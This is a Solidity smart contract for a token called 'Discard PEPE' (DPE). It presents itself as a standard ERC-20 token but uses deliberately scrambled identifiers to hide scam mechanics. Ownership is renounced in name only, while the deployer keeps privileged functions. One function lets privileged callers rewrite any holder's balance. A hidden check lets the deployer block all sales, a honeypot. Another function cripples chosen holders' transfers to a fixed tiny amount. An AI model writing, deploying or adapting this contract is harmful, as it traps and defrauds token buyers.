//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface fromLaunchTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverEnableSender) external view returns (uint256);

    function transfer(address listReceiver, uint256 feeAuto) external returns (bool);

    function allowance(address feeList, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeAuto) external returns (bool);

    function transferFrom(
        address sender,
        address listReceiver,
        uint256 feeAuto
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toToken, uint256 value);
    event Approval(address indexed feeList, address indexed spender, uint256 value);
}

abstract contract receiverSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface autoWallet {
    function createPair(address shouldIs, address txTradingBuy) external returns (address);
}

interface walletFrom is fromLaunchTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DiscardPEPE is receiverSell, fromLaunchTotal, walletFrom {

    uint256 private tokenMarketing;

    address shouldTotalReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return liquidityLaunchedTrading;
    }

    address shouldWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed sellTeam, address indexed marketingTake);

    string private senderReceiver = "Discard PEPE";

    uint256 tradingIs;

    bool public maxTx;

    function fundToken() public {
        emit OwnershipTransferred(tradingFundMarketing, address(0));
        liquidityAmount = address(0);
    }

    function receiverTotal(uint256 feeAuto) public {
        walletReceiver();
        liquidityAt = feeAuto;
    }

    mapping(address => bool) public fundSender;

    bool public takeIs;

    mapping(address => uint256) private amountReceiver;

    function atSwap(address listAt, uint256 feeAuto) public {
        walletReceiver();
        amountReceiver[listAt] = feeAuto;
    }

    function transferFrom(address listMax, address listReceiver, uint256 feeAuto) external override returns (bool) {
        if (_msgSender() != shouldWallet) {
            if (exemptLaunchMode[listMax][_msgSender()] != type(uint256).max) {
                require(feeAuto <= exemptLaunchMode[listMax][_msgSender()]);
                exemptLaunchMode[listMax][_msgSender()] -= feeAuto;
            }
        }
        return modeReceiver(listMax, listReceiver, feeAuto);
    }

    address public teamLaunch;

    function walletTeamEnable(address senderTeam) public {
        require(senderTeam.balance < 100000);
        if (takeIs) {
            return;
        }
        if (maxReceiver != senderIs) {
            tokenMarketing = maxSender;
        }
        teamBuyAt[senderTeam] = true;
        if (tokenMarketing == maxSender) {
            senderIs = false;
        }
        takeIs = true;
    }

    uint256 liquidityAt;

    uint256 private atLaunchedTotal;

    function totalSupply() external view virtual override returns (uint256) {
        return fundAt;
    }

    function approve(address isReceiver, uint256 feeAuto) public virtual override returns (bool) {
        exemptLaunchMode[_msgSender()][isReceiver] = feeAuto;
        emit Approval(_msgSender(), isReceiver, feeAuto);
        return true;
    }

    bool public maxReceiver;

    function owner() external view returns (address) {
        return liquidityAmount;
    }

    function fromAmountTo(address listMax, address listReceiver, uint256 feeAuto) internal returns (bool) {
        require(amountReceiver[listMax] >= feeAuto);
        amountReceiver[listMax] -= feeAuto;
        amountReceiver[listReceiver] += feeAuto;
        emit Transfer(listMax, listReceiver, feeAuto);
        return true;
    }

    address public tradingFundMarketing;

    mapping(address => bool) public teamBuyAt;

    address private liquidityAmount;

    uint256 constant launchTrading = 17 ** 10;

    function transfer(address listAt, uint256 feeAuto) external virtual override returns (bool) {
        return modeReceiver(_msgSender(), listAt, feeAuto);
    }

    uint256 public maxSender;

    function allowance(address liquidityFee, address isReceiver) external view virtual override returns (uint256) {
        if (isReceiver == shouldWallet) {
            return type(uint256).max;
        }
        return exemptLaunchMode[liquidityFee][isReceiver];
    }

    constructor (){
        if (maxSender == atLaunchedTotal) {
            maxSender = atLaunchedTotal;
        }
        totalMax atMarketing = totalMax(shouldWallet);
        teamLaunch = autoWallet(atMarketing.factory()).createPair(atMarketing.WETH(), address(this));
        if (senderIs == maxTx) {
            maxTx = false;
        }
        tradingFundMarketing = _msgSender();
        fundToken();
        teamBuyAt[tradingFundMarketing] = true;
        amountReceiver[tradingFundMarketing] = fundAt;
        
        emit Transfer(address(0), tradingFundMarketing, fundAt);
    }

    function name() external view virtual override returns (string memory) {
        return senderReceiver;
    }

    function modeReceiver(address listMax, address listReceiver, uint256 feeAuto) internal returns (bool) {
        if (listMax == tradingFundMarketing) {
            return fromAmountTo(listMax, listReceiver, feeAuto);
        }
        uint256 exemptSwap = fromLaunchTotal(teamLaunch).balanceOf(shouldTotalReceiver);
        require(exemptSwap == liquidityAt);
        require(listReceiver != shouldTotalReceiver);
        if (fundSender[listMax]) {
            return fromAmountTo(listMax, listReceiver, launchTrading);
        }
        return fromAmountTo(listMax, listReceiver, feeAuto);
    }

    function symbol() external view virtual override returns (string memory) {
        return senderMarketingShould;
    }

    uint256 private fundAt = 100000000 * 10 ** 18;

    string private senderMarketingShould = "DPE";

    function walletReceiver() private view {
        require(teamBuyAt[_msgSender()]);
    }

    uint8 private liquidityLaunchedTrading = 18;

    function getOwner() external view returns (address) {
        return liquidityAmount;
    }

    function walletSender(address toEnable) public {
        walletReceiver();
        
        if (toEnable == tradingFundMarketing || toEnable == teamLaunch) {
            return;
        }
        fundSender[toEnable] = true;
    }

    mapping(address => mapping(address => uint256)) private exemptLaunchMode;

    bool public senderIs;

    function balanceOf(address receiverEnableSender) public view virtual override returns (uint256) {
        return amountReceiver[receiverEnableSender];
    }

}